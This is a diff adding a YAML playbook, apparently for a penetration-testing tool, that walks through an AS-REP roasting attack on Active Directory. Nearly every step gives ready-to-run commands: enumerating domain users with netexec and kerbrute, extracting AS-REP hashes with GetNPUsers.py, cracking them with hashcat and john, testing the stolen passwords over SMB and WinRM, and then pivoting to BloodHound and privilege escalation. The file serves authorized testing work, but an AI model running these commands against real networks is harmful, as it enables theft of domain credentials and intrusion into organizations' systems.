@@ -1,0 +1,93 @@
+name: ad.asreproast
+
+steps:
+
+  - id: identify_users
+    title: Identify Valid Domain Users
+
+    info: |
+      AS-REP roasting requires valid usernames.
+
+    checklist:
+      - Enumerate users via SMB / LDAP
+      - Look for usernames in shares or descriptions
+      - Use Kerberos pre-auth errors for validation
+
+    commands:
+      - netexec smb {ip} -u '' -p '' --users
+      - kerbrute userenum --dc {ip} users.txt
+
+  - id: check_preauth
+    title: Identify Users Without Pre-Auth
+
+    info: |
+      Only accounts with "Do not require Kerberos preauthentication"
+      are vulnerable to AS-REP roasting.
+
+    checklist:
+      - Use tools to detect users without pre-auth
+      - Look for specific Kerberos responses
+
+    commands:
+      - GetNPUsers.py {domain}/ -no-pass -dc-ip {ip}
+
+  - id: asrep_roast
+    title: Perform AS-REP Roasting
+
+    info: |
+      Request AS-REP responses for users without pre-auth.
+
+    checklist:
+      - Provide valid usernames
+      - Save hashes for cracking
+
+    commands:
+      - GetNPUsers.py {domain}/ -usersfile users.txt -format hashcat -outputfile asrep.txt
+
+    run:
+      type: module
+      name: ad.test
+      args: []
+
+  - id: crack_hashes
+    title: Crack AS-REP Hashes
+
+    info: |
+      Crack extracted hashes to obtain plaintext passwords.
+
+    checklist:
+      - Use correct hash mode (18200 for AS-REP)
+      - Try common wordlists first
+
+    commands:
+      - hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+      - john --format=krb5asrep asrep.txt
+
+  - id: validate_creds
+    title: Validate Credentials
+
+    info: |
+      Test cracked credentials against services.
+
+    checklist:
+      - SMB login
+      - WinRM access
+      - LDAP bind
+
+    commands:
+      - netexec smb {ip} -u {user} -p {password}
+      - netexec winrm {ip} -u {user} -p {password}
+
+  - id: escalate
+    title: Next Steps (Post-Cred Access)
+
+    info: |
+      Use obtained credentials for further attacks.
+
+    checklist:
+      - BloodHound collection
+      - Kerberoasting
+      - Privilege escalation
+
+    commands:
+      - netexec smb {ip} -u {user} -p {password} --bloodhound
